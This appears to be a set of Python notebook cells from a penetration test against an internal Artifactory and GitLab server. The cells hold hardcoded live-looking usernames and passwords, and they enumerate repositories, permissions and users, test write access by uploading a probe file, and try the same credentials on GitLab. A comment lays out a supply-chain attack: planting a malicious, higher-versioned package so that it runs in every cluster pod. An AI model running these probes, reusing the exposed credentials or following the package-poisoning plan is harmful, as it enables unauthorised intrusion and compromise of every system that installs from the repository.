### artifcatory / poetry 
import requests
requests.packages.urllib3.disable_warnings()

# From environ:
artifactory_base = "https://repo.artifactory-dogen.group.echonet"
user = "sparrow-pull"  
pwd = "KeGFur3Mev9id3LJ0Ylf"
# Also the UV index URL user:
uv_user = "datalab-pull"
uv_pwd = "t7ZzmAxMHYHQvmNDBjjP"

# Test 1 — What repos can we see?
r = requests.get(
    f"{artifactory_base}/artifactory/api/repositories",
    auth=(user, pwd),
    verify=False
)
print(f"Repos status: {r.status_code}")
if r.status_code == 200:
    for repo in r.json():
        print(f"  {repo['key']:40} type={repo['type']} pkg={repo.get('packageType','?')}")

# Test 2 — What's our permission level?
r = requests.get(
    f"{artifactory_base}/artifactory/api/security/permissions",
    auth=(user, pwd),
    verify=False
)
print(f"\nPermissions status: {r.status_code}")
if r.status_code == 200:
    print(r.json())

# Test 3 — Who are we in Artifactory?
r = requests.get(
    f"{artifactory_base}/artifactory/api/security/users/sparrow-pull",
    auth=(user, pwd),
    verify=False
)
print(f"\nUser info: {r.status_code}")
print(r.text[:500])

------------------------

## write access
# Try uploading a test file to the pypi repo
# In a real pentest this is where you'd plant a malicious package

repo = "ap12287-datalab-python"

# Test 1 — Can we list the repo contents?
r = requests.get(
    f"{artifactory_base}/artifactory/api/storage/{repo}",
    auth=(user, pwd),
    verify=False
)
print(f"List repo: {r.status_code}")
if r.status_code == 200:
    for child in r.json().get('children', []):
        print(f"  {child['uri']}")

# Test 2 — Can we deploy/write?
# Try uploading a dummy file
r = requests.put(
    f"{artifactory_base}/artifactory/{repo}/test-probe/probe.txt",
    auth=(user, pwd),
    data=b"pentest probe",
    verify=False
)
print(f"\nWrite test: {r.status_code}")
if r.status_code in [200, 201]:
    print("!!! WRITE ACCESS CONFIRMED — supply chain attack possible!")
    # Clean up
    requests.delete(
        f"{artifactory_base}/artifactory/{repo}/test-probe/probe.txt",
        auth=(user, pwd), verify=False
    )

# Test 3 — Can we see other repos we shouldn't?
r = requests.get(
    f"{artifactory_base}/artifactory/api/repositories?type=local",
    auth=(user, pwd),
    verify=False
)
print(f"\nAll local repos: {r.status_code}")
if r.status_code == 200:
    for repo in r.json():
        print(f"  {repo['key']}")
        
-------------------
### gitlab

# The UV_INDEX_URL had gitlab-style credentials
# Check if these work on a GitLab instance

gitlab_base = "https://repo.artifactory-dogen.group.echonet"

# Try GitLab API with both credential sets
for u, p in [(user, pwd), (uv_user, uv_pwd)]:
    
    # Test 1 — List accessible projects
    r = requests.get(
        f"{gitlab_base}/api/v4/projects",
        auth=(u, p),
        verify=False
    )
    print(f"\nGitLab projects ({u}): {r.status_code}")
    if r.status_code == 200:
        for proj in r.json()[:10]:
            print(f"  {proj['path_with_namespace']} "
                  f"access={proj.get('permissions')}")

    # Test 2 — Current user info
    r = requests.get(
        f"{gitlab_base}/api/v4/user",
        headers={"PRIVATE-TOKEN": p},
        verify=False
    )
    print(f"GitLab user ({u}): {r.status_code} {r.text[:200]}")

    # Test 3 — Can we read internal repos?
    r = requests.get(
        f"{gitlab_base}/api/v4/projects?visibility=internal&membership=false",
        auth=(u, p),
        verify=False
    )
    print(f"Internal repos: {r.status_code} count={len(r.json()) if r.status_code==200 else 'N/A'}")
    
    
 ----------------
 ## test 
 
 # If write access is confirmed, the attack would be:
# 1. Find a package used by ALL sparrow/datalab pods
# 2. Upload a malicious version with higher version number
# 3. Wait for pods to update/reinstall
# 4. Malicious code runs in EVERY pod in the cluster

# Check what packages are in the private repo
r = requests.get(
    f"{artifactory_base}/artifactory/api/search/quick?name=*",
    params={"repos": "ap12287-datalab-python"},
    auth=(user, pwd),
    verify=False
)
print(f"Package search: {r.status_code}")
if r.status_code == 200:
    results = r.json().get('results', [])
    print(f"Found {len(results)} packages:")
    for pkg in results[:20]:
        print(f"  {pkg['uri']}")

# Also check PyPI simple index format
r = requests.get(
    f"{artifactory_base}/artifactory/api/pypi/{repo}/simple/",
    auth=(user, pwd),
    verify=False
)
print(f"\nPyPI simple index: {r.status_code}")
print(r.text[:1000])
